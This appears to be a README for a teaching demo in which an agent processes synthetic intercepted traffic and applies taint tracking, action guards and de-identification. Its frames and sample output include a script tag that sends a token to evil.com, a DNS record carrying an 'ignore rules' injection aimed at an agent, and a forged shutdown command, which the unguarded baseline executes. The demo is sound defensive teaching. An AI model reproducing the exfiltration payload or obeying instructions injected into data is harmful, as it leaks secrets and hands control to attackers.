# Demo 09: InterceptBound

## Learning Objectives

- Model intercepted/relayed traffic with synthetic frames
- Implement provenance and taint labels on parsed data
- Distinguish observations from instructions in traffic
- Build ephemeral buffers with safe deletion
- Design downstream action guards
- De-identify what is observed: pseudonymize identities, redact secrets

## Conceptual Explanation

An agent processing intercepted traffic sees forged responses. **Taint tracking** labels data by source: `trusted_local`, `user_supplied`, `intercepted_network`. Labels are attached at the capture boundary; the agent propagates them to every parsed field and never invents trust. Sensitive downstream actions require low taint *and* non-intercepted provenance.

### The Problem

```
Intercepted HTTP Response  →  Agent  →  "token=abc"  →  Store in DB
                          →  Agent  →  "shutdown"   →  EXECUTE!
```

### The Solution

**Taint tracking + Action guards**: Every parsed field carries its frame's taint level and provenance. Each action has a taint ceiling (`record_observation: high`, `update_dns_cache: medium`, `store_credential`/`system_shutdown: low`; anything undeclared: `low`), and the privileged `low`-ceiling actions refuse `intercepted_network` data whatever its taint label says. Credential-, command-, and injection-shaped content is found by named detection rules over the wire data — not by reading the fixture's annotation.

## Safety Notice

⚠️ **Teaching demonstration only.**
- **No ARP poisoning, MITM, or credential collection**
- No public interception or third-party traffic
- Fake credentials and local canaries only

## Running the Demo

```bash
make demo DEMO=09
```

### Expected Output

Key lines, verbatim (the run prints all 8 frames for each agent):

```
--- Unguarded Baseline (no scope, no taint, no guard) ---
  frame_001 (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint high):
    ALLOWED: record_observation [status]
    ALLOWED: store_token [body]
  frame_005 (custom 192.168.1.30:9999->192.168.1.100:54323, intercepted_network, taint high):
    ALLOWED: execute_shutdown [payload_INJECTION]

--- Taint-Aware Guarded (scope -> taint -> buffer -> guard) ---
  frame_001 (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint high):
    BLOCKED: store_token (taint_too_high: high > low) [body]
    ALLOWED: record_observation [status]
  frame_002 (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint high):
    BLOCKED: process_injection (injection_detected: script_tag,js_exfil) [body_INJECTION]
    ALLOWED: record_observation [status]
  frame_003 (dns 192.168.1.1:53->192.168.1.100:12345, intercepted_network, taint high):
    BLOCKED: update_dns_cache (taint_too_high: high > medium) [answers[0].value]
    BLOCKED: process_injection (injection_detected: canary_marker,instruction_phrase) [answers[1].value_INJECTION]
    ALLOWED: record_observation [query]
  frame_004 (tls 192.168.1.20:443->192.168.1.100:54322, intercepted_network, taint medium):
    ALLOWED: record_observation [cert_fingerprint]
  frame_005 (custom 192.168.1.30:9999->192.168.1.100:54323, intercepted_network, taint high):
    BLOCKED: process_injection (injection_detected: privileged_command) [payload_INJECTION]
    BLOCKED: execute_shutdown (taint_too_high: high > low) [payload_INJECTION]
  frame_006 (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint medium):
    ALLOWED: record_observation [status]
  frame_007 (http 10.0.0.99:80->192.168.1.100:54321, intercepted_network, taint high):
    BLOCKED: process_frame (source_not_allowed: 10.0.0.99)
  frame_008 (local 127.0.0.1->127.0.0.1, trusted_local, taint low):
    ALLOWED: store_token [body]

--- Observation log: what each agent writes down ---
  Baseline (recorded in the clear):
    http 192.168.1.10:80 {"user": "alice", "contact": "alice@corp.example", "role": "admin", "token"
    http 192.168.1.10:80 <html><body>Welcome! <script>fetch('http://evil.com/steal?token='+localStor
    dns 192.168.1.1:53 api.internal.example -> 10.0.0.50,CANARY_DNS_INJECTION_IGNORE_RULES
    tls 192.168.1.20:443 CN=api.internal.example
    custom 192.168.1.30:9999 DATA_CHUNK_1
    http 192.168.1.10:80 {"error": "unauthorized"}
    http 10.0.0.99:80 {"user": "alice", "contact": "alice@corp.example", "token": "DEMO_TOKEN_FORGED
    local 127.0.0.1 {"service": "api.internal.example", "token": "DEMO_LOCAL_TOKEN_XYZ789"}
  Guarded (de-identified before recording):
    http HOST_0272:80 {"user": "USER_5aff", "contact": "EMAIL_e50e", "role": "admin", "token": "[RED
    http HOST_0272:80 <html><body>Welcome! <script>fetch('http://evil.com/steal?token=[REDACTED]
    dns HOST_239e:53 api.internal.example -> HOST_b6d0,CANARY_DNS_INJECTION_IGNORE_RULES
    tls HOST_ec1a:443 CN=api.internal.example
    custom HOST_ff75:9999 DATA_CHUNK_1
    http HOST_0272:80 {"error": "unauthorized"}
    local HOST_f63c {"service": "api.internal.example", "token": "[REDACTED]"}
  De-identified before recording: 1 username, 1 email, 8 IPs, 3 secrets; 0 identities or secrets written in the clear
  (frame_007 is out of scope, so the guarded agent never records it - the baseline logs its user and token anyway)

--- Provenance rule: a laundered taint label still cannot store an intercepted token ---
  frame_001_relabelled_low (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint low):
    BLOCKED: store_token (intercepted_network_cannot_drive_privileged_action) [body]

--- Ephemeral Buffer ---
After delete: None  (buffer's own 22-byte copy is now b'\x00\x00\x00\x00\x00\x00'...)
Agent buffer after the run: 0 live entries (stored=27, zeroed=27, expired=0, evicted=0)
```

The **observation log** is the one thing the guarded agent is allowed to keep, and it is de-identified before it is written down. Between scope and taint (`scope → observe/de-identify → taint → guard`), each per-frame note runs through `shared/anonymize.py` (`Anonymizer.deidentify`): source IPs and usernames become stable pseudonyms (`HOST_0272`, `USER_5aff`), the synthetic `contact` e-mail (added to frame_001 and frame_007) becomes `EMAIL_e50e`, and tokens/passwords are redacted to `[REDACTED]`. Pseudonyms are stable across frames — so records still join — and locally reversible via `agent.anon.reverse(tag)`. The baseline records the same notes in the clear; frame_007 is out of scope, so the guarded agent never records it while the baseline logs its user and forged token anyway.

## Traffic Frames

| Frame | Protocol | Source | Provenance | Taint | Wire content of interest |
|-------|----------|--------|------------|-------|--------------------------|
| `frame_001` | HTTP | 192.168.1.10 | intercepted | HIGH | Token in JSON body |
| `frame_002` | HTTP | 192.168.1.10 | intercepted | HIGH | Injected `<script>fetch('http://evil.com/…')</script>` in HTML |
| `frame_003` | DNS | 192.168.1.1 | intercepted | HIGH | A record `10.0.0.50` + TXT canary `…IGNORE_RULES` |
| `frame_004` | TLS | 192.168.1.20 | intercepted | MEDIUM | Clean handshake metadata |
| `frame_005` | Custom | 192.168.1.30 | intercepted | HIGH | `{"command": "shutdown", …}` chunk in the stream payload |
| `frame_006` | HTTP | 192.168.1.10 | intercepted | MEDIUM | Clean 401 Unauthorized |
| `frame_007` | HTTP | 10.0.0.99 | intercepted | HIGH | Forged token from a source outside the allowlist |
| `frame_008` | Local | 127.0.0.1 | `trusted_local` | LOW | Operator-supplied credential-rotation record with a token |

The fixture's `injection` and `expected` fields are the answer key for the tests and the results generator; the agents never read them.

## Taint Levels

| Level | Fixture frames | What the guard lets it drive |
|-------|----------------|------------------------------|
| `LOW` | `frame_008` (`trusted_local`) | Any action — but if provenance is `intercepted_network`, privileged actions (ceiling `low`) are still refused |
| `MEDIUM` | `frame_004`, `frame_006` (intercepted, clean) | `record_observation`, `update_dns_cache` |
| `HIGH` | `frame_001`, `002`, `003`, `005`, `007` (intercepted; `frame_001` carries a credential, not an injection) | `record_observation` only |

## Action Guard

```python
guard = ActionGuard("low", {"record_observation": "high", "update_dns_cache": "medium",
                            "store_credential": "low", "system_shutdown": "low"})
guard.authorize("store_credential",   TaintLevel.HIGH, body, Provenance.INTERCEPTED_NETWORK)  # (False, 'taint_too_high: high > low')
guard.authorize("store_credential",   TaintLevel.LOW,  body, Provenance.INTERCEPTED_NETWORK)  # (False, 'intercepted_network_cannot_drive_privileged_action')
guard.authorize("record_observation", TaintLevel.HIGH, 200,  Provenance.INTERCEPTED_NETWORK)  # (True, 'authorized')
guard.authorize("store_credential",   TaintLevel.LOW,  body, Provenance.TRUSTED_LOCAL)        # (True, 'authorized')
```

## Ephemeral Buffer

- Max size: 1000 entries (oldest evicted first once full)
- TTL: 60 seconds
- Secure delete: the buffer's own `bytearray` copy is zeroed on delete, expiry, and eviction; the agent purges a frame's entries as soon as the frame is decided (the run ends with `0 live entries`)
- Other copies of a value (the parsed-field objects, printed lines) are dropped, not zeroed — which is why the guard also blocks storing it durably

## Exercises

### Beginner
1. **Replay detection** — Detect replayed frames (`seen_nonces`; frame_005's chunks carry nonces)

### Standard
2. **Taint refinement with justification** — Downgrade `status`-type fields with a logged rule id; rule 2 still holds
3. **Scope by protocol** — Add `allowed_protocols` to the scope policy, keeping the uniform result shape

### Extension
4. **Omission detection** — Detect omitted frames in sequence
5. **Credential canary** — Buffer a fingerprint, never the credential

## Key Files

| File | Purpose |
|------|---------|
| `fixtures/traffic.json` | 8 synthetic traffic frames, scope policy with per-action ceilings, buffer config, `expected` answer key |
| `student/interceptbound.py` | Detector, tracker, buffer, guard, agents |
| `student/generate_intercept_results.py` | Results generator — compares both agents' verdicts with the fixture's `expected` block, exits 1 on mismatch |
| `tests/test_interceptbound.py` | 44 tests |

---

*Next: [Demo 10: ScanBound](../demos/10-scanbound.md)*